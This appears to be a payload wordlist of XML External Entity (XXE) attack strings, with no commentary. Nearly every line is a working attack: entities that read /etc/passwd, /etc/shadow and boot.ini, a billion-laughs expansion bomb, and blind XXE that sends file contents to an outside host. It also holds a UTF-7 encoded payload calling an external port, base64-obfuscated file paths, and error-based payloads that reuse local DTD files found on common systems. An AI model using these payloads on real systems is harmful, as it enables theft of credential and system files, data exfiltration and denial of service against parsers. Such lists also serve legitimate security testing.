<?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <data>&file;</data>
<?xml version="1.0" encoding="ISO-8859-1"?>   <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<!--?xml version="1.0" ?--> <userInfo>  <firstName>John</firstName>  <lastName>Doe</lastName> </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY example "Doe"> ]>  <userInfo>   <firstName>John</firstName>   <lastName>&example;</lastName>  </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]> <userInfo>  <firstName>John</firstName>  <lastName>&ent;</lastName> </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">   <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> <tag>&lol9;</tag>
<?xml version="1.0"?> <!DOCTYPE foo [   <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?> <!DOCTYPE foo [ <!ELEMENT foo (#ANY)> <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
<?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]> <foo><result>&ac;</result></foo>
<?xml version="1.0"?> <!DOCTYPE foo [   <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
<?xml version="1.0"?> <!DOCTYPE lolz [ <!ENTITY test SYSTEM "https://example.com/entity1.xml">]> <lolz><lol>3..2..1...&test<lol></lolz>
<?xml version="1.0" encoding="UTF-7"?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
<soap:Body>   <foo>     <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>   </foo> </soap:Body>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/multihwpcreport-0.3.dtd">     <!ENTITY % hwpcreport.dtd '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd">     <!ENTITY % expr 'aaa)>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa (bb'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd">     <!ENTITY % boolean '(aa) #IMPLIED>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ATTLIST attxx aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/zaproxy/xml/alert.dtd">     <!ENTITY % alertDef '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">     <!ENTITY % n.InProceedings 'aaa)>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa (bb'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Code\projects\dtd-finder\samples\new\boostbook.dtd">     <!ENTITY % boost.common.attrib '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd">     <!ENTITY % f '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/dtd/f.dtd">     <!ENTITY % g '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docbook/stylesheet/docbook-xsl/common/l10n.dtd">     <!ENTITY % xmlns '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-2.0/language-specs/language.dtd">     <!ENTITY % commonAttributes '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
